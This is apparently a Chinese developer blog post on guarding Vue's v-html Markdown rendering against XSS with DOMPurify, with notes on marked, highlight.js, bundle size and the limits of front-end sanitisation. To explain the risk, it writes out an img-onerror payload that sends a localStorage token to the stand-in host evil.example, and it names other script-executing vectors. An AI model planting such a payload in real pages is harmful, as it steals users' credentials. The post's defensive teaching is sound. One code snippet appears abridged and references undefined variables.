---
title: Markdown 渲染与 XSS 防护
summary: 从 marked 到 v-html 之间必须隔一个 DOMPurify。四步管线、marked 的三个坑、highlight.js 的体积账，以及前端净化到底挡得住什么。
category: 建站记
tags: 前端, 安全, 踩坑记录
status: 1
is_top: 0
---

后台编辑器是一个 textarea，正文是 Markdown。详情页渲染它只有一行：

```html
<div class="markdown-body" v-html="contentHtml"></div>
```

写的时候我以为这是一个"渲染"问题：能不能正确显示标题、代码块、表格。后来才意识到它是一个**安全边界**问题——`v-html` 把字符串当 HTML 插进 DOM，字符串里有什么，浏览器就做什么。

而正文的作者，是可以写 HTML 的。

## v-html 是一扇直接开向 DOM 的门

`v-html` 等价于 `element.innerHTML = 字符串`。它不做任何检查。

如果正文里出现这行：

```html
<img src=x onerror="fetch('//evil.example/?t=' + localStorage.getItem('token'))">
```

![同一段恶意正文，过不过净化是两种截然不同的结局](/diagrams/xss-flow.svg)

图片加载失败，`onerror` 触发，token 作为查询参数发出去。整个过程用户看不到任何异常。

这里有个容易搞错的细节：通过 `innerHTML` 插入的 `<script>` 标签**通常不会执行**——浏览器按规范不执行动态插入的脚本。但 `<img onerror>`、`<svg onload>`、`<iframe srcdoc>`、`<a href="javascript:...">` 全都会执行。所以"我只防 script 标签"是不够的，这也是很多"简单过滤一下"的方案漏得莫名其妙的原因。

具体到这套代码，`stores/user.js` 里写着：

```js
const token = ref(localStorage.getItem('token') || '')
```

token 存 localStorage 是为了刷新不失联，代价就是任何一段能执行在同源页面里的 JS 都能一行读走它。换成 `httpOnly` Cookie 能挡住这行读取，代价是 CSRF 和一整套 Cookie 策略。这套前端选了前者，所以**正文渲染这一层的净化没有退路**。

攻击面还不止"作者"。现在是单人博客，作者就是我自己，风险可控。如果哪天开放投稿，作者就是陌生人，恶意 Markdown 会直接进数据库，每个打开文章的人都中招。

## 四步管线：每一步只解决一件事

渲染函数只有 8 行（`utils/markdown.js`）：

```js
export function renderMarkdown(raw) {
  if (!raw) return ''
  const html = marked.parse(raw)
  return DOMPurify.sanitize(html, {
    ADD_ATTR: ['target', 'rel'],
  })
}
```

看起来是"解析 + 净化"两步，实际执行的是四步：

1. `marked.parse(raw)` 把 Markdown 变成 HTML 字符串
2. `marked-highlight` 在解析过程中接管代码块，塞进 `<span class="hljs-keyword">` 这类标签
3. `DOMPurify.sanitize(html)` 按白名单把危险标签和属性删掉
4. `v-html` 把净化后的字符串插进 DOM

![渲染分四步，DOMPurify 站在插入 DOM 之前把危险标签删干净](/diagrams/markdown-pipeline.svg)

前三步都在字符串层面，第四步才碰 DOM。

**为什么不能是两步？** 如果只做 `marked.parse` → `v-html`，等于没防：marked 默认允许正文里写原始 HTML，`<img onerror>` 会被原样输出。很多教程里的"Markdown 渲染"就是这两步，在个人玩具里没问题，一旦作者不完全可信就是漏洞。

**为什么高亮要排在净化前面？** 因为高亮本身就在往 HTML 里加标签。顺序反过来——先净化再高亮——那高亮产生的标签就没经过白名单。虽然 highlight.js 的输出是可信的，但"最后统一过一遍白名单"是一条不需要逐处论证的规则。我的原则是：**先让所有步骤把 HTML 全产生出来，在插入 DOM 之前统一净化一次。**

**为什么净化必须在插入之前？** 因为 DOMPurify 处理的是字符串。如果先 `v-html` 再"事后清理 DOM"，中间那一瞬间脚本已经跑完了。顺序不是代码风格，是安全语义。

详情页和编辑器预览用的是同一个函数：

```js
// ArticleDetail.vue
const contentHtml = computed(() => renderMarkdown(article.value?.content || ''))
// ArticleEdit.vue
const previewHtml = computed(() => renderMarkdown(form.content))
```

这一点比看起来重要。如果预览走一条管线、正式渲染走另一条，就会出现"预览里好好的，发布后被剥掉"，或者更糟的"预览安全、线上可执行"。同一个函数，没有第二种行为。

## marked 的三个坑

### 一、`setOptions({ highlight })` 已经不存在了

老教程里的写法是这样的：

```js
marked.setOptions({
  highlight: (code, lang) => hljs.highlight(code, { language: lang }).value,
})
```

在 marked 18.2 上跑这段代码：**不报错**。代码块照样渲染成 `<pre><code>`，只是没有颜色。

这是最难受的一类失效——不是崩溃，是静默降级。我一开始以为是主题 CSS 没引入，翻了两遍样式文件，最后才在 marked 的更新说明里看到 `highlight` 选项从 v5 起被移出核心，改由 `marked-highlight` 提供。

正确写法是先建扩展，再交给 `Marked` 构造：

```js
const marked = new Marked(
  markedHighlight({
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      if (lang && hljs.getLanguage(lang)) {
        try {
          return hljs.highlight(code, { language: lang }).value
        } catch {
          // 高亮失败就退回纯文本，不要因为一个代码块让整页崩掉
        }
      }
      return code
    },
  }),
  { breaks: true, gfm: true },
)
```

`try/catch` 那层不是摆设。`hljs.highlight()` 遇到不完整或异常的输入会抛错，一个写错的代码块不该让整篇文章白屏。渲染是尽力而为，不是必须成功。

### 二、`langPrefix` 决定主题能不能命中

`langPrefix: 'hljs language-'` 生成的是：

```html
<code class="hljs language-go">
```

两个类名各有作用：`hljs` 让主题里的基础样式（背景、内边距、字体）生效，`language-go` 让 Go 关键字的配色生效，也让语言标记能被识别。

如果只写 `'language-'`，`<code>` 上就没有 `hljs` 类，主题里 `.hljs { background: … }` 那一层不命中，结果是"关键字有颜色，但代码块没有背景和内边距"。看起来像高亮了，又像没高亮——我第一次就卡在这个半生效状态上。

### 三、`breaks` 和 `gfm` 改变的是写作者的体感

```js
{ breaks: true, gfm: true }
```

`breaks: true` 让单个换行变成 `<br>`。标准 Markdown 里软换行只是空格，分段要空一行。但博客写作里，我在 textarea 里敲回车就是想换行。开了它写起来符合直觉，代价是从别处粘来的标准 Markdown 会多出一些换行。

`gfm: true` 打开表格、删除线、自动链接。它其实是 marked 的默认值，我显式写出来，是为了让"这个行为是我要的"留在代码里，而不是碰巧依赖某个版本的默认值。

## 体积账：全量 1MB 和 11 种语言

`utils/markdown.js` 开头有一段警告注释，我不想删掉：

```js
// ❗ 不要写 import hljs from 'highlight.js'
// 那会把 190 多种语言的语法定义全打进包里（构建产物多出约 1MB）。
// 按需引入核心 + 本项目实际用到的语言，体积从 ~1MB 降到 ~40KB。
```

所以引入的是 `highlight.js/lib/core`，然后逐个注册 11 种语言：bash、css、go、javascript、json、markdown、python、sql、typescript、xml、yaml。

每种语言除了本名还注册别名，因为代码块里的语言标记是人手写的：`golang`、`js`、`ts`、`py`、`sh`、`md`、`html`、`vue` 都得能命中。其中 `vue` 指向 xml——highlight.js 没有 Vue 语法，用 XML 兜底，至少标签和属性有颜色。

关于数字，口径要说清楚。注释里的"~1MB → ~40KB"是写代码时的估算，指高亮这一块的增量。我能实测的是整个 chunk：

| 项 | 实测值 | 来源 |
|---|---|---|
| `markdown-DtHCqlQH.js` | 144,279 字节（gzip 46,997） | 本地 `dist/assets`，2026-11-14 构建 |
| JS/CSS 体积（不含图） | 1.0 MB / 70 个文件（当时） | `du -sh dist/assets`、`docs/05-上线实录` |
| 按需引入前后 | JS/CSS 1.7MB → 1.0MB，最大 JS 830KB → 141KB | `docs/03-部署.md` 对比表 |

这个 chunk 里装的是 marked + marked-highlight + highlight.js + DOMPurify 四样，不是单独的 highlight.js，所以我不把 144,279 当成"高亮占用"。能确认的是三件事：它比全量引入小了一个数量级；它是懒加载的（只有详情页和编辑器会请求）；它不在首屏路径上。

代价也很具体：**写 Rust 或 Swift 的代码块不会有颜色**。走到 `hljs.getLanguage(lang)` 返回 false 那条路，原样输出纯文本，不崩、不高亮。

还有一个我没收拾干净的地方：详情页引的是 `github-dark.css`，编辑器预览引的是 `github.css`，同一段代码在两处配色不一样。写文章时看着浅色预览，发出来是深色。

## 白名单：加两个属性，别加一类属性

DOMPurify 的默认白名单足够覆盖博客排版：标题、列表、表格、`pre/code`、引用、图片、链接。

代码里显式加了一项：

```js
DOMPurify.sanitize(html, { ADD_ATTR: ['target', 'rel'] })
```

我翻了本地装的 dompurify 3.4.17 的默认属性表（`node_modules/dompurify/dist/purify.es.mjs` 里的 `html` 数组）：`rel` 在里面，**`target` 不在**。所以要让自己正文里写的外链能新窗口打开，`target` 必须显式加。

顺带说 `rel`：它不是被默认剥掉的，加它是为了提醒自己——`target="_blank"` 要配 `rel="noopener noreferrer"`，否则被打开的页面能通过 `window.opener` 反向操作原页面（老浏览器上的 tabnabbing 攻击）。这两个属性应该成对出现，写进同一个 `ADD_ATTR`，下次改的时候不容易漏。

注意加的是**两个具体属性**，不是把 `ALLOW_UNKNOWN_PROTOCOLS` 打开，也没有放宽 `ALLOWED_URI_REGEXP`。白名单的安全性来自"默认拒绝"，每放开一项都在缩小保护范围——放开的理由必须具体到"这一项我要用在哪"。

### 前端净化挡不住什么

这条边界必须说清楚，否则容易误以为"过了 DOMPurify 就安全了"。

**它保护的是读文章的人的浏览器。** 净化发生在渲染时，数据库里存的仍是原始 Markdown 和原始 HTML。这意味着：

- 任何**不经过这个前端**的消费方都不受保护。以后要是加 RSS、邮件订阅、小程序、App，它们各自得把净化再做一遍——或者干脆在服务端统一做。
- 如果攻击者能直接调 `POST /api/v1/admin/articles` 写内容（比如 token 被偷），恶意 HTML 会进库。但每个读者打开页面时仍要过一遍 DOMPurify，所以这一层还在。
- 如果哪天做 SSR，服务端渲染时忘了净化，前端这层就白做了。

后端为什么不在写入时净化？因为存的是 Markdown 原文，而 Markdown 允许合法地嵌 HTML——我想在正文里手写一个带 class 的 div 或内嵌 SVG 时，写入期净化会把它们一起改掉，而且再进编辑器看到的就不是自己写的东西了。这是取舍：**存原文、渲染时净化**，把可信边界放在"谁能写"上（现在只有登录用户能写，实际就我一个）。

真要开放投稿，我会改成两层：写入时服务端净化一次，拦掉明显恶意的内容；渲染时前端再净化一次，做纵深防御。**前端净化永远替代不了"限制谁能写"。**

## 图片与图注：让讲解图自己说话

这个博客的插图不是截图，是手写的 SVG（`frontend/public/diagrams/` 下，960 宽、深色底），正文里这样引用：

```markdown
![Markdown 到 DOM 的四步管线，危险标签在净化这一步被剥掉](/diagrams/markdown-pipeline.svg)
```

渲染层对图片做了三件事，都在 `renderMarkdown` 里：

1. **把 `<img>` 包进 `<figure>`**，把 `alt` 渲染成可见的 `<figcaption>`
2. **`alt` 同时充当无障碍描述**，读屏器读它，图片加载失败时也显示它
3. **外层包一个链接**，点击在新标签页打开原始 SVG 大图

```js
function renderFigure({ href, title, text }) {
  const alt = (text || '').trim()
  return `<figure class="md-figure">
    <a class="md-figure-link" href="${src}" target="_blank" rel="noopener">
      <img src="${src}" alt="${altAttr}" loading="lazy" />
    </a>
    ${alt ? `<figcaption>${alt}</figcaption>` : ''}
  </figure>`
}
```

所以 `alt` 不能写「图 1」。它要写成一句完整的结论，比如「一条 SQL 取回全部评论，按 parent_id 分桶再挂到父节点，查询次数恒定为 1」。这句话在三个地方同时生效：图注、读屏、图片加载失败时的替身。

实现上有两个细节值得记：

- **属性值必须转义**。`alt` 和 `title` 是作者可控文本，直接拼进属性会被 `"` 逃逸出标签。DOMPurify 虽然会兜底，但没必要让它兜。
- **marked 会把独占一段的图片包进 `<p>`**，而 `<figure>` 不能嵌在 `<p>` 里。浏览器会自动纠正，但会留下一个空 `<p>` 撑出多余间距。所以净化前先做一次字符串替换，把 `<p><figure>…</figure></p>` 摘成 `<figure>…</figure>`。

这样设计的目的只有一个：**图上要有结论**。每张 SVG 底部还有一行 30–55 字的判断句，读者扫图加图注就能拿到那一节的重点，不必先读完全文。图如果只是把正文再画一遍，不如不画。

## 这些债我认

**DOMPurify 只挡 XSS，不挡难看。** 没闭合的 `<div>`、比正文宽一倍的表格、一行两百字符的代码、5 MB 的封面图，它全都照单全收。安全白名单和排版质量是两件事。

**没有服务端渲染。** 正文是客户端渲染的，爬虫和社交平台的预览拿到的是一段空 div。个人笔记可以接受，但要认真做内容分发，这条路走不通。

**没有代码块复制按钮、没有文章目录。** 图片点击放大已经做了（打开原始 SVG），但代码块只能在编辑器里手动复制。

**没有图片压缩。** 编辑器上传的封面是原图，后端 `UPLOAD_MAX_MB=5`，5 MB 以内的图直接落盘，页面上原样加载。真要在意，应该在上传前用 canvas 压一遍。

**服务端没有二次检查。** 写入接口对 `content` 字段没有任何 HTML 层面的校验，防线只有"必须登录"和"前端净化"两条。

**高亮语言是白名单制。** 新增一种语言要改代码、重新构建、重新发版。博客的语言种类有限，这个代价我接受，但它确实不是"随手就能支持"。

---

这一篇没讲"渲染得多好看"，只讲"渲染得多安全"。`v-html` 那一行代码只有一行，但它前面必须站着四步。
